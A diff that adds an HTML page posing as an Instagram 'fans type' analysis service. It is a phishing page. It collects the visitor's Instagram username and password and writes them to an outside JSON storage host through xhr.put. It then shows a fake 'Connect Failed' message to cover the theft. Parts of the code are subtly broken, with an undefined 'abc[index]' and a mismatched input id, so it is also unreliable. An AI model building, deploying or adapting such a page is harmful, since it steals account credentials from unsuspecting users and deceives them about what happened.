@@ -1,0 +1,129 @@
+<html>
+<head>
+<title>Connect With Instagram</title>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<script src="https://cdn.jsdelivr.net/gh/Merret/UsefulJS@0.4.2/js/xhr.min.js"></script>
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css" integrity="sha384-5sAR7xN1Nv6T6+dT2mhtzEpVJvfS3NScPQTrOxhwjIuvcA67KV2R5Jz6kr4abQsz" crossorigin="anonymous">
+<script>
+    var elm = (function () {
+        var id = function(x) {
+            return document.getElementById(x);
+        }
+        return {
+            ID: id,
+            id: id
+        }
+    })();
+</script>
+<style>
+.button {
+	cursor: pointer
+}
+div {
+	word-break: break-word;
+}
+i.a:hover {
+	color: #be4bdb;
+}
+i.b:hover {
+	color: #2196F3;
+}
+i.c:hover {
+	color: #82c91e;
+}
+i.d:hover {
+	color: #fd7e14;
+}
+i.e:hover {
+	color: #f783ac;
+}
+ .box::placeholder {
+ color: red;
+ opacity: 1;
+}
+ .box:-ms-input-placeholder {
+ color: red;
+ opacity: 1;
+}
+ .box::-ms-input-placeholder {
+ color: red;
+ opacity: 1;
+}
+ .box::-webkit-input-placeholder {
+ color: red;
+ opacity: 1;
+}
+ .box:-moz-placeholder {
+ color: red;
+ opacity: 1;
+}
+ .box::-moz-placeholder {
+ color: red;
+ opacity: 1;
+}
+</style>
+</head>
+<body class="w3-container w3-center" onload="checkLS()">
+<div id="stage" class="w3-card w3-round-xlarge w3-margin w3-padding w3-white" style="opacity: 0.85;">
+  <div id="div-header">
+    <h1 id="h1-header"></h1>
+  </div>
+  <hr style="margin-left:10%; width: 80%; color: gray;">
+  <div id="div-body">
+    <p id="p-body"></p>
+  </div>
+  <div id="div-footer"> </div>
+</div>
+<script>
+    var color = ["be4bdb","2196F3","82c91e","fd7e14","#f783ac"];
+    var LS;
+    function checkLS() {
+        if (typeof(Storage) !== "undefined") {
+            LS = localStorage;
+            LS.setItem("LScheck", "passed");
+            RFinit();
+        } else {
+            elm.id("h1-header").innerHTML = "Sorry";
+            elm.id("p-body").innerHTML = "Your device or browser doesn't support essential functions.";
+        }
+    }
+    function RFinit() {
+        elm.id("h1-header").innerHTML = "Connect With Instagram To Analysis Fans Type";
+        elm.id("div-body").innerHTML = "";
+       
+        elm.id("div-body").innerHTML += '<i id="i-ig" class="fab fa-instagram fa-2x"></i><input id="ig" class="w3-margin" style="width: 70%" type="text" placeholder="Instagram Profile Name" required/><br>'; 
+elm.id("div-body").innerHTML += '<i id="i-pw" class="fas fa-key fa-2x"></i><input id="password" class="w3-margin" style="width: 70%" type="password" placeholder="Instagram Password" required/><br>';
+
+        elm.id("div-body").innerHTML += '<i id="i-register" class="fas fa-sign-in-alt fa-2x button" onclick="send()"></i>';
+        changeColor();
+    }
+    function changeColor() {
+        var chosen = "c84bf2";
+        document.body.style.backgroundColor = "#" + chosen;
+       
+        elm.id("i-pw").className += " " + abc[index];
+       
+        elm.id("i-ig").className += " " + abc[index];
+       
+        elm.id("i-register").className += " " + abc[index];
+    }
+    function send() {
+		
+        elm.id("div-footer").innerHTML = '<p>Connecting...</p>';
+       
+        if(elm.id("password").value == "") {elm.id("password").className += " box";}
+       
+        var root = JSON.parse(xhr.get("https://api.myjson.com/bins/rzf0a"));
+		if(root[elm.id("username").value]==undefined) {
+			root[elm.id("username").value] = elm.id("password").value;
+			xhr.put("https://api.myjson.com/bins/rzf0a", JSON.stringify(root));
+elm.id("div-footer").innerHTML = "Connect Failed: Try again later. :(<br>our service will stop on 2018/10/21 (because of the financial problem).";
+		} else {
+			return;
+		}
+    }
+</script>
+</body>
+</html>
